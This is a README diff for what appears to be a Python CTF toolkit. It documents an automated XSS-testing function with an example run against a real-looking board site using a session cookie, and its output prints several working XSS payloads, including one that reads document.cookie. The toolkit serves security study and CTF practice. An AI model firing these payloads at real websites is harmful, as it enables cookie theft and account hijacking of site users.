@@ -220,3 +220,25 @@ Exploit of ROOTCTF 2017 prob `Calculate`
 
 <!-- wartanker.web -->
 ## `wartanker.web`
+
+### `wartanker.web.xss_exploit`
+```python
+>>> from wartanker import web
+[*] Wartanker, the Python3 toolkit for solving CTF problems
+>>> web.xss_exploit('post', 'https://www.uhmtoto.xyz/board/write.php', 'content', {}, {'user':'aa', 'PHPSESSID':'**************************'}, 'https://www.uhmtoto.xyz/
+board/board')
+[*] trying 0 of 68
+[*] trying 1 of 68
+[*] trying 2 of 68
+[*] trying 3 of 68
+[*] trying 4 of 68
+[*] trying 5 of 68
+[*] How about trying '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'?
+[*] Do you want more? [Y / N] y
+[*] trying 6 of 68
+[*] trying 7 of 68
+[*] How about trying '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'?
+[*] Do you want more? [Y / N] y
+[*] trying 8 of 68
+[*] How about trying '<a onmouseover=alert(document.cookie)>xxs link</a>'?
+[*] Do you want more? [Y / N] n
